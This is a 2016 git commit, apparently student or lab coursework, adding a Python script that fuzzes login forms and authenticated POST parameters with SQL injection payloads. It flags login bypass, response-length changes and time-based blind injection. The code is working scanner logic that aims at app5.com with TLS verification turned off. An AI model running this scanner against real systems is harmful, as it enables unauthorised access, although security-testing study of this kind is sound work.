6310f79ee1cfc2a67dbb35ed00415e01078b7af4
xionggg <xiongtianren@163.com>
2016-04-18 19:51:37 +0800

    s3_test to be final version

--- s3_function.py
+++ s3_function.py
@@ -1,7 +1,35 @@
-def b():
-  # something
-  return 1
+import requests
+from difflib import Differ
+def self_checkIfCanLogin(payload, loginurl, header):
+	request = requests.post(loginurl, data=payload, headers=header, verify=False)
+	content = request.content.lower().replace(" ", "")
+	if ("logout" in content) and (request.status_code == 200):
+		for param in payload:
+			if ("name='"+param+"'" in content) or ('name="'+param+'"' in content):
+				return False
+		return True
+	else:
+		return False
 
-def c():
-  # something
-  return 2
+def self_checkStillLoggedIn(loginpayload, content):
+	content = content.lower().replace(" ", "")
+	if ("logout" in content):
+		for param in loginpayload:
+			if ("name='"+str(param)+"'" in content) or ('name="'+str(param)+'"' in content):
+				return False
+		return True
+	else:
+		return False
+	
+def self_post(load, url, header):
+	request = requests.post(url, data=load, headers=header, verify=False)
+	return request
+	
+def self_get(load, url, header):
+	request = requests.get(url, params=load, headers=header, verify=False)
+	return request
+	
+def self_gotsqlsyntaxerror(content):
+	if ("You have an error in your SQL syntax" in content) | ("Fatal error" in content) | ("Invalid id" in content):	
+		return True
+	return False
--- s3_test.py
+++ s3_test.py
@@ -1,4 +1,171 @@
-from s3_function import b,c
-print b()
-print c()
+import yaml
+import json
+import requests
+import time
+import copy
+from pprint import pprint
+from s3_function import self_checkIfCanLogin,self_post,self_get,self_gotsqlsyntaxerror,self_checkStillLoggedIn
+from difflib import Differ
+jsonform = []
+loginPayloadDict = {}
+header = {
+			"Referer": "https://app5.com/www/index.php",
+			"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+		}
+with open('s2.json') as file:
+	payloads = yaml.safe_load(file);
+with open('login.json') as file:
+	print "--------------loading login information--------------------"
+	data = json.load(file)
+	for loginurls in data["loginurls"]:
+		loginurl = loginurls["loginurl"]
+		loginPayload = loginurls["loginpayload"]
+		if(loginurl in loginPayloadDict):
+			payloadList = loginPayloadDict[loginurl]
+			payloadList.append(loginPayload)
+		else:			
+			loginPayloadDict[loginurl] = loginPayload
 
+with open('phase1.json') as data_file:
+	print "--------------loading url information--------------------"
+	data = json.load(data_file)
+	urlsToProcess = data["urls"]
+	for urls in data["urls"]:	
+		url = urls["url"]
+		if url in loginPayloadDict:	
+			urlsToProcess.remove(urls)
+			#process login urls firstif url in loginPayloadDict:
+			#it's a log in url
+			#get all log in accounts and password
+			crendentials = loginPayloadDict[url]
+			initialLoad = copy.deepcopy(urls["param"])
+			#get first log in credential to test is enough
+			#assign param to crendentials
+			for param in crendentials:
+				initialLoad[param] = [crendentials[param]]
+			credential = copy.deepcopy(initialLoad)
+			
+			#try to log in and get the response content
+			loginStatus = self_checkIfCanLogin(credential, url, header)
+			if not loginStatus:
+				print "Login fail, please check your credentials below"
+				print url
+				print credential
+			else:
+				#try different payload to test if login has vunlerbility
+				for payload in payloads:
+					for param in credential:
+						#replace the login parameter with different payload, test if can log in
+						fakeCredential = copy.deepcopy(credential)
+						if param in loginPayloadDict[url]:
+							fakeCredential[param][0] = fakeCredential[param][0] + payload
+							loginStatus = self_checkIfCanLogin(fakeCredential, url, header)
+							if loginStatus:
+								#logged in successful, consider hack successfully
+								initialUrl = copy.deepcopy(urls)
+								initialUrl["param"] = fakeCredential
+								jsonform.append(initialUrl)	
+				loginPayloadDict[url] = credential
+	data["urls"] = copy.deepcopy(urlsToProcess)
+	
+	
+	print"-------------Processing post and required log in-----------------------"
+	#process those get parameter with login required
+	for urls in data["urls"]:	
+		url = urls["url"]
+		if(urls["type"]=="POST") and (urls["loginrequired"] == "true") and (url not in loginPayloadDict):
+			urlsToProcess.remove(urls)
+			loginurl = urls["loginurl"]
+			# Log in first
+			# get log in url from config file
+			if loginurl in loginPayloadDict:
+				#it's a log in url
+				credential = loginPayloadDict[loginurl]
+				loginpayload = credential					
+				with requests.Session() as s:
+					print loginpayload
+					p = s.post(loginurl, data=loginpayload, verify=False)
+					if p.status_code != 200:
+						print "Error while log in"
+					else:
+						# An authorised request.
+						initialLoad = copy.deepcopy(urls["param"])	
+						# put some initial value to the post
+						for param in initialLoad:
+							if (not initialLoad[param]) | (initialLoad[param][0] is None) | (initialLoad[param][0] == ""):
+								initialLoad[param] =  ["a"]							
+						start = time.time()
+						initialRequest = s.post(url,data = initialLoad, headers=header, verify = False)
+						initialContent = initialRequest.content
+						initialTrip = time.time() - start
+						print "-------------------Initial Request---------------------"
+						print initialRequest.headers
+						print url
+						print initialLoad
+						print "----------------------------------------"							
+						initialLength = len(initialRequest.content)#int(initialRequest.headers["Content-Length"])
+						initialStatus = initialRequest.status_code
+						initialEndingUrl = initialRequest.url
+						for param in initialLoad:
+							for payload in payloads:
+								#replace each parameter with the payload to test
+								load = copy.deepcopy(initialLoad)
+								#print load[param]
+								#print param
+								#print type(load[param])
+								if (not load[param]) or (load[param][0] is None) or (load[param][0] == "None"):
+									load[param] =  [payload]
+								else:
+									load[param][0] =  load[param][0]+payload
+								start = time.time()
+								r = s.post(url,data = load, headers=header, verify = False)
+								newContent = r.content
+								trip = time.time() - start
+								length = len(r.content)
+								status = r.status_code
+								newEndingUrl = r.url
+								# only if the content lenght is larger, and the status code is 200
+								# or the response time is much longger say 5 seconds for Time-based blind SQL injection
+								# we consider it's a valid attack
+								parsedInitialEndingUrl=initialEndingUrl
+								if("?" in initialEndingUrl):
+									index = int(initialEndingUrl.find("?"))
+									parsedInitialEndingUrl = initialEndingUrl[0:index]
+								parsedNewEndingUrl = newEndingUrl
+								if("?" in newEndingUrl):
+									index = int(newEndingUrl.find("?"))
+									#print index
+									parsedNewEndingUrl = newEndingUrl[0:index]
+															
+								print "------------------aaaaaaa----------------------"
+								print length
+								print initialLength
+								print (not payload in r.content)
+								print self_gotsqlsyntaxerror(r.content)
+								print r.content.count(payload)
+								print payload
+								print len(payload)
+								print length - initialLength
+								print "----------------------------------------"
+								if (((length > initialLength) and (status == 200)) and(abs(length - initialLength) > r.content.count(payload)*len(payload)) or ((trip - initialTrip) > 5)) and (parsedNewEndingUrl == parsedInitialEndingUrl) and (self_checkStillLoggedIn(loginpayload,r.content)) and (not self_gotsqlsyntaxerror(r.content)):
+									initialUrl = copy.deepcopy(urls)
+									initialUrl["param"] = load
+									initialUrl["loginpayload"] = loginpayload
+									jsonform.append(initialUrl)								
+									print "----------------------------------------"
+									print length
+									print initialLength
+									print parsedNewEndingUrl
+									print parsedInitialEndingUrl
+									print "----------------------------------------"				
+									text_file = open("Output.txt", "w")
+									text_file.write(newContent)
+									text_file.close()
+									text_file = open("OutputInitial.txt", "w")
+									text_file.write(initialContent)
+									text_file.close()
+	data["urls"] = copy.deepcopy(urlsToProcess)
+
+	
+with open("phase3_output.json",'w') as outfile:	
+	json.dump(jsonform,outfile,indent=2)
